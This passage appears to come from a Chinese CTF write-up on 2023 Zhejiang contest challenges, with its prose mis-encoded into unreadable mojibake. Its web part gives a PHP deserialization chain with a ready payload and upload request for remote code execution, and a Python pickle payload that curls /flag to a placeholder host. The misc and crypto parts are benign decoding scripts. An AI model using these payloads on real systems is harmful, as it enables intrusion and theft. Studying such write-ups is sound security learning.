class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;goaway!!!&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ä»<code>CCC::__destruct</code>è¿›å…¥ï¼Œæœ‰ä¸ªåˆ¤æ–­ï¼Œç”¨<code>&amp;</code>å¼•ç”¨åœ°å€ï¼Œä½¿<code>$a</code>æ°¸è¿œä¸<code>$b</code>ç›¸ç­‰ï¼Œç„¶åechoè§¦å‘<code>AAA::__toString</code>ï¼Œæ¥ç€å¯ä»¥é€šè¿‡returnå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„å±æ€§æ¥è§¦å‘<code>BBB::__get</code>ï¼Œæœ€åç»•è¿‡æ­£åˆ™å®ç°rce</p>
<p>æœ€åç»“å°¾è¿˜æœ‰ä¸€ä¸ª<code>throw new Exception</code>ï¼Œç ´åå­—ç¬¦ä¸²ç»“æ„å³å¯è§¦å‘fast destruct</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CCC</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$c</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = &amp;<span class="hljs-variable language_">$this</span>-&gt;a;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-string">&#x27;flag&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;a === <span class="hljs-variable language_">$this</span>-&gt;b) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;c;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AAA</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$s</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;lewiserii&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$p</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;s-&gt;<span class="hljs-variable">$p</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BBB</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;/???/?? /* .&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$this</span>-&gt;b) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;b)) &#123;<br>            <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>            <span class="hljs-variable">$flag</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;ok&#x27;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;br/&gt;get it!!&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">CCC</span>();<br><span class="hljs-variable">$a</span>-&gt;c = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">AAA</span>();<br><span class="hljs-variable">$a</span>-&gt;c-&gt;s = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">BBB</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure>

<p><code>O%3A3%3A%22CCC%22%3A3%3A%7Bs%3A1%3A%22c%22%3BO%3A3%3A%22AAA%22%3A2%3A%7Bs%3A1%3A%22s%22%3BO%3A3%3A%22BBB%22%3A1%3A%7Bs%3A1%3A%22b%22%3Bs%3A12%3A%22%2F%3F%3F%3F%2F%3F%3F+%2F%2A+.%22%3B%7Ds%3A1%3A%22a%22%3Bs%3A9%3A%22lewiserii%22%3B%7Ds%3A1%3A%22a%22%3BN%3Bs%3A1%3A%22b%22%3BR%3A6%3B</code></p>
<p>é€šè¿‡é€šé…ç¬¦åŒ¹é…&#x2F;bin&#x2F;cpï¼Œå°†æ ¹ç›®å½•æ‰€æœ‰æ–‡ä»¶å¤åˆ¶åˆ°æ ¹ç›®å½•ï¼Œç„¶åè®¿é—®è·å¾—flag</p>
<p>æˆ–è€…é€šè¿‡<code>. /???/????????[@-[]</code>åŒ¹é…phpçš„ä¸´æ—¶æ–‡ä»¶æ¥rce</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">POST /?ctf=O%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>CCC%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>c%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>AAA%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>s%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>BBB%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A20%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>.+%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>F%<span class="hljs-number">5</span>B%<span class="hljs-number">40</span>-%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A9%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>lewiserii%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>a%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BN%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>b%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BR%<span class="hljs-number">3</span>A6%<span class="hljs-number">3</span>B% HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">100.100</span>:<span class="hljs-number">10033</span><br>Content-Length: <span class="hljs-number">186</span><br>Cache-Control: max-age=<span class="hljs-number">0</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Origin: <span class="hljs-literal">null</span><br>Content-Type: multipart/form-data; boundary=----WebKitFormBoundary0xXn6nlxZVqh49pS<br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">119.0</span>.<span class="hljs-number">0.0</span> Safari/<span class="hljs-number">537.36</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/avif,image/webp,image/apng,*<span class="hljs-comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS</span><br><span class="hljs-comment">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="hljs-comment">Content-Type: text/plain</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">cat /f*</span><br><span class="hljs-comment">------WebKitFormBoundary0xXn6nlxZVqh49pS--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure>


<h2 id="å†³èµ›-babyWeb"><a href="#å†³èµ›-babyWeb" class="headerlink" title="å†³èµ›[babyWeb]"></a>å†³èµ›[babyWeb]</h2><p>pickleååºåˆ—åŒ–</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">import</span> base64<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">GetShellWithPython</span>(<span class="hljs-title class_ inherited__">object</span>):<br>   <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):<br>       <span class="hljs-keyword">import</span> subprocess<br>       <span class="hljs-keyword">return</span> (subprocess.call,<br>              ([<span class="hljs-string">&#x27;python&#x27;</span>,<br>                 <span class="hljs-string">&#x27;-c&#x27;</span>,<br>                 <span class="hljs-string">&#x27;import os;&#x27;</span><br>                 <span class="hljs-string">&#x27;os.system(&quot;curl http://x.x.x.x:4444?a=`cat /flag`&quot;);&#x27;</span>],))<br><br>pickleData = pickle.dumps(GetShellWithPython())<br><br><span class="hljs-built_in">print</span>(base64.b64encode(pickleData))<br></code></pre></td></tr></table></figure>


<h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="åˆèµ›-number-game"><a href="#åˆèµ›-number-game" class="headerlink" title="åˆèµ›[number game]"></a>åˆèµ›[number game]</h2><p>æŸ¥çœ‹index.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">roll</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> _0x38f496 = _0x359f<br>      , _0x1afb7a = <span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xda</span>)](<span class="hljs-title class_">Math</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd5</span>)]() * <span class="hljs-number">0x3e8</span>);<br>    <span class="hljs-variable language_">document</span>[<span class="hljs-string">&#x27;getElementById&#x27;</span>](<span class="hljs-string">&#x27;number&#x27;</span>)[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xdc</span>)] = _0x1afb7a[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd3</span>)]();<br>    <span class="hljs-keyword">if</span> (_0x1afb7a == <span class="hljs-number">0x539</span>) &#123;<br>        <span class="hljs-keyword">var</span> _0x14184c = [<span class="hljs-number">0x38</span>, <span class="hljs-number">0x6f</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x1</span>, <span class="hljs-number">0x3c</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0xa</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0xb</span>, <span class="hljs-number">0x5d</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x1e</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3d</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x2a</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x1a</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x5a</span>]<br>          , _0x477866 = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> _0x6698b7 = <span class="hljs-number">0x0</span>; _0x6698b7 &lt; _0x14184c[<span class="hljs-string">&#x27;length&#x27;</span>]; _0x6698b7++)<br>            _0x477866 += <span class="hljs-title class_">String</span>[<span class="hljs-title function_">_0x38f496</span>(<span class="hljs-number">0xd9</span>)](_0x14184c[_0x6698b7] ^ _0x6698b7 + <span class="hljs-number">0x5a</span>);<br>        <span class="hljs-title function_">alert</span>(_0x477866);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0x38</span>,<span class="hljs-number">0x6f</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x32</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x45</span>,<span class="hljs-number">0x1</span>,<span class="hljs-number">0x3c</span>,<span class="hljs-number">0x24</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x55</span>,<span class="hljs-number">0x38</span>,<span class="hljs-number">0xa</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x28</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x33</span>,<span class="hljs-number">0xb</span>,<span class="hljs-number">0x5d</span>,<span class="hljs-number">0x20</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0x46</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0x3d</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0x2a</span>,<span class="hljs-number">0x41</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x49</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x31</span>,<span class="hljs-number">0x5a</span>]<br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    a[i]=v^i+<span class="hljs-number">0x5a</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(a))<br></code></pre></td></tr></table></figure>

<h2 id="åˆèµ›-Ez-misc"><a href="#åˆèµ›-Ez-misc" class="headerlink" title="åˆèµ›[Ez_misc]"></a>åˆèµ›[Ez_misc]</h2><p>æ–‡ä»¶é«˜ä½å’Œä½ä½äº¤æ¢ä½ç½®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.jpg&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;2.jpg&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>d=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    n=(i//<span class="hljs-number">16</span>)+((i&amp;<span class="hljs-number">0xf</span>)&lt;&lt;<span class="hljs-number">4</span>)<br>    f1.write(<span class="hljs-built_in">bytes</span>([n]))<br></code></pre></td></tr></table></figure>

<p>steghideç©ºå¯†ç è§£å¯†å¾—åˆ°flag.txt</p>
<p><img src="/img/wp/2023/2023zhejiang-6.png"></p>
<p>å°†<code>DASH</code>æ›¿æ¢æˆ<code>-</code>ï¼Œ<code>DOT</code>æ›¿æ¢æˆ<code>.</code>åè§£æ‘©æ–¯</p>
<p><img src="/img/wp/2023/2023zhejiang-7.png"></p>
<h2 id="åˆèµ›-Steins-Gate"><a href="#åˆèµ›-Steins-Gate" class="headerlink" title="åˆèµ›[Steins_Gate]"></a>åˆèµ›[Steins_Gate]</h2><p>ç»™äº†ä¸€å¼ å¾ˆå¤§çš„å›¾ç‰‡ï¼Œç”±<code>å˜Ÿå˜Ÿå™œ</code>ç»„æˆä¸€å¼ å›¾ç‰‡ï¼Œè§‚å¯Ÿå‘ç°æ¯ä¸ªå­—æ˜¯<code>16*16</code></p>
<p>çŒœæµ‹æ˜¯æŠŠåŸå›¾åƒç´ æ›¿æ¢æˆæ–‡å­—äº†</p>
<p>åœ¨æ¯ä¸ªå­—ä¸­æ‰¾ä¸€ä¸ªå›ºå®šçš„åƒç´ ç‚¹ï¼Œç„¶åæå–åƒç´ è¿˜åŸåŸå›¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;Steins_Gate.png&#x27;</span>)<br>width,height=img.size<br><br>new_img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-built_in">int</span>(width / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(height / <span class="hljs-number">16</span>)))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>,height,<span class="hljs-number">16</span>):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>,width,<span class="hljs-number">16</span>):<br>        tmp = img.getpixel((j,i))<br>        <span class="hljs-built_in">print</span>(tmp)<br>        new_img.putpixel((<span class="hljs-built_in">int</span>(j / <span class="hljs-number">16</span>), <span class="hljs-built_in">int</span>(i / <span class="hljs-number">16</span>)), (tmp[<span class="hljs-number">0</span>], tmp[<span class="hljs-number">1</span>], tmp[<span class="hljs-number">2</span>]))<br><br>new_img.show()<br>new_img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023zhejiang-8.png"></p>
<p>ä½¿ç”¨stegsolveå‘ç°0é€šé“æœ‰å¾ˆå¤šbase64</p>
<p><img src="/img/wp/2023/2023zhejiang-9.png"></p>
<p>æå–å‡ºæ¥åå‘ç°æ¯ç»„åè¿˜æœ‰12ä¸ªå­—èŠ‚çš„å†—ä½™æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f1:<br>        data=f.read()<br>        i=<span class="hljs-number">0</span><br>        <span class="hljs-keyword">while</span> i&lt;<span class="hljs-built_in">len</span>(data):<br>            f1.write(data[i:i+<span class="hljs-number">240</span>]+<span class="hljs-string">b&quot;\n&quot;</span>)<br>            i+=<span class="hljs-number">252</span><br></code></pre></td></tr></table></figure>

<p>å»é™¤å†—ä½™æ•°æ®åbase64è§£å‡ºä¸€å¼ å›¾ç‰‡</p>
<p><img src="/img/wp/2023/2023zhejiang-10.png"></p>
<p>åŒæ—¶ä¹Ÿæ˜¯å¤šè¡Œbase64çš„å½¢å¼ï¼Œå°è¯•base64éšå†™</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment">#base64è§£ç è„šæœ¬ï¼ŒPython2 è¿è¡Œ</span><br><br>b64chars = <span class="hljs-string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    bin_str = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        stegb64 = <span class="hljs-string">&#x27;&#x27;</span>.join(line.split())<br>        rowb64 =  <span class="hljs-string">&#x27;&#x27;</span>.join(stegb64.decode(<span class="hljs-string">&#x27;base64&#x27;</span>).encode(<span class="hljs-string">&#x27;base64&#x27;</span>).split())<br>        offset = <span class="hljs-built_in">abs</span>(b64chars.index(stegb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>])-b64chars.index(rowb64.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)[-<span class="hljs-number">1</span>]))<br>        equalnum = stegb64.count(<span class="hljs-string">&#x27;=&#x27;</span>)<br>        <span class="hljs-keyword">if</span> equalnum:<br>            bin_str += <span class="hljs-built_in">bin</span>(offset)[<span class="hljs-number">2</span>:].zfill(equalnum * <span class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)])<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°å¯†ç <code>DuDuLu~T0_Ch3@t_THe_w0r1d</code></p>
<p>outguessè§£å¯†å¾—åˆ°flag</p>
<p><img src="/img/wp/2023/2023zhejiang-11.png"></p>
<h2 id="å†³èµ›-Xcode-v5-8"><a href="#å†³èµ›-Xcode-v5-8" class="headerlink" title="å†³èµ›[Xcode v5.8]"></a>å†³èµ›[Xcode v5.8]</h2><p>xxencode-&gt;base58</p>
<p><img src="/img/wp/2023/2023zhejiang-12.png"></p>
<h2 id="å†³èµ›-Ez-Signin"><a href="#å†³èµ›-Ez-Signin" class="headerlink" title="å†³èµ›[Ez_Signin]"></a>å†³èµ›[Ez_Signin]</h2><p>zipçˆ†ç ´å¯†ç ï¼Œå¾—åˆ°<code>11452</code></p>
<p>base32è§£å¯†åå¾—åˆ°ä¸€ä¸ªæ–‡æœ¬</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">MoveTo 495, 314<br>KeyUp &quot;CapsLock&quot;, 1<br>LeftClick 1<br>LeftDown 1<br>MoveTo 495, 313<br>MoveTo 495, 312<br>MoveTo 494, 312<br>MoveTo 494, 311<br>MoveTo 493, 311<br>Delay 1<br>...<br>çœç•¥<br>...<br>MouseWheel 1<br>Delay 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>MouseWheel 1<br>KeyDown &quot;CapsLock&quot;, 1<br></code></pre></td></tr></table></figure>

<p>æ ¹æ®æ–‡æœ¬å†…å®¹è¿›è¡Œç”»å›¾</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.new(<span class="hljs-string">&quot;1&quot;</span>,(<span class="hljs-number">2000</span>,<span class="hljs-number">2000</span>))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>)<br>d=f.read().splitlines()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> d:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;MoveTo&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> i:<br>        <span class="hljs-keyword">continue</span><br>    i=i[<span class="hljs-number">6</span>:].split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>    x=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">0</span>])<br>    y=<span class="hljs-built_in">int</span>(i[<span class="hljs-number">1</span>])<br>    a.putpixel((x,y),<span class="hljs-number">255</span>)<br>a.save(<span class="hljs-string">&quot;1.png&quot;</span>)<br></code></pre></td></tr></table></figure>

<p><img src="/img/wp/2023/2023zhejiang-13.png"></p>
<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="åˆèµ›-å°å°æ•°å­¦å®¶"><a href="#åˆèµ›-å°å°æ•°å­¦å®¶" class="headerlink" title="åˆèµ›[å°å°æ•°å­¦å®¶]"></a>åˆèµ›[å°å°æ•°å­¦å®¶]</h2><p>è®¡ç®—å¼å­</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[]<br>a.append(<span class="hljs-number">19</span>+<span class="hljs-number">49</span>)<br>a.append(<span class="hljs-number">96</span>-<span class="hljs-number">31</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">47</span>)<br>a.append(<span class="hljs-number">29</span>+<span class="hljs-number">55</span>)<br>a.append(<span class="hljs-number">35</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">81</span>+<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">73</span>-<span class="hljs-number">16</span>)<br>a.append(<span class="hljs-number">52</span>+<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">0</span>+<span class="hljs-number">56</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">69</span>-<span class="hljs-number">20</span>)<br>a.append(<span class="hljs-number">99</span>-<span class="hljs-number">48</span>)<br>a.append(<span class="hljs-number">100</span>-<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">36</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">32</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">84</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">90</span>-<span class="hljs-number">34</span>)<br>a.append(<span class="hljs-number">94</span>-<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">85</span>+<span class="hljs-number">13</span>)<br>a.append(<span class="hljs-number">50</span>-<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">55</span>-<span class="hljs-number">3</span>)<br>a.append(<span class="hljs-number">77</span>+<span class="hljs-number">25</span>)<br>a.append(<span class="hljs-number">87</span>-<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">62</span>+<span class="hljs-number">35</span>)<br>a.append(<span class="hljs-number">88</span>-<span class="hljs-number">43</span>)<br>a.append(<span class="hljs-number">86</span>-<span class="hljs-number">30</span>)<br>a.append(<span class="hljs-number">90</span>+<span class="hljs-number">10</span>)<br>a.append(<span class="hljs-number">66</span>-<span class="hljs-number">17</span>)<br>a.append(<span class="hljs-number">34</span>+<span class="hljs-number">63</span>)<br>a.append(<span class="hljs-number">51</span>-<span class="hljs-number">6</span>)<br>a.append(<span class="hljs-number">22</span>+<span class="hljs-number">76</span>)<br>a.append(<span class="hljs-number">46</span>+<span class="hljs-number">5</span>)<br>a.append(<span class="hljs-number">45</span>+<span class="hljs-number">11</span>)<br>a.append(<span class="hljs-number">20</span>+<span class="hljs-number">78</span>)<br>a.append(<span class="hljs-number">56</span>+<span class="hljs-number">45</span>)<br>a.append(<span class="hljs-number">99</span>//<span class="hljs-number">1</span>)<br>a.append(<span class="hljs-number">47</span>+<span class="hljs-number">52</span>)<br>a.append(<span class="hljs-number">58</span>+<span class="hljs-number">44</span>)<br>a.append(<span class="hljs-number">76</span>-<span class="hljs-number">26</span>)<br>a.append(<span class="hljs-number">92</span>-<span class="hljs-number">42</span>)<br>a.append(<span class="hljs-number">12</span>+<span class="hljs-number">44</span>)<br>a.append(<span 